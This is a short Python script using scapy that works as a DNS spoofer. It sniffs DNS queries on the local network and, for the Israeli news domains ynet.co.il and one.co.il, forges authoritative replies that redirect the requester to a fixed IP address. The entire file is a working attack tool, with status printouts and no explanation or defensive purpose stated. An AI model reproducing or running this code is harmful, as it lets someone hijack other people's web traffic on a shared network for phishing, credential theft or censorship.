from scapy.all import *

TARGET_SITES = [b"ynet.co.il.", b"www.ynet.co.il.", b"one.co.il.", b"www.one.co.il."]
FAKE_IP = "8.8.8.8"

def filterDNS(p):
    return DNSQR in p

def prnDNS(p):
    qname = p[DNSQR].qname
    
    if qname in TARGET_SITES:
        domain_str = qname.decode('utf-8').rstrip('.')
        print(f"[!] Target detected: {domain_str} (Requested by: {p[IP].src})")
        
        ip_layer = IP(src=p[IP].dst, dst=p[IP].src)
        
        udp_layer = UDP(sport=p[UDP].dport, dport=p[UDP].sport)
        
        dns_layer = DNS(
            id=p[DNS].id,          
            qr=1,                  
            aa=1,                
            qd=p[DNS].qd,          
            an=DNSRR(             
                rrname=qname, 
                type='A', 
                rclass='IN', 
                ttl=60, 
                rdata=FAKE_IP   
            )
        )
        
        spoofed_packet = ip_layer / udp_layer / dns_layer
        
        print(f"[+] Sending spoofed DNS reply: {domain_str} -> {FAKE_IP}")
        send(spoofed_packet, verbose=False)

print(f"[*] Starting DNS spoofer. Redirecting targets to {FAKE_IP}...")
sniff(lfilter=filterDNS, prn=prnDNS, store=0)
